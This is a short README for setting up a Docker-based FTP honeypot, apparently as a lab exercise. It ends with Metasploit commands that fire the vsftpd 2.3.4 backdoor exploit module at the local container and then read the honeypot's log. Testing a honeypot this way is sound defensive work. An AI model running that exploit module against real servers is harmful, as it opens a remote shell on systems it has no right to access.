# FTP Honeypot – Setup Instructions

## Step 1: Create and Clone the Project

```bash
mkdir ftp-honeypot-project
cd ftp-honeypot-project
git clone https://github.com/nourrrrhane/ftp-honeypot-project.git
ls
```

You should see 3 files.

---

## Terminal 1: Build and Run the Honeypot

```bash
docker build -t ftp-honeypot .
```

You should see no errors.

```bash
docker run -it --rm -p 21:21 -p 6200:6200 --name honeypot ftp-honeypot
```

---

## Terminal 2: Test with Metasploit

```bash
nmap -sV 127.0.0.1
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 127.0.0.1
run

```

#view logs
```bash
docker exec honeypot tail -f /var/log/honeypot_backdoor.log
```

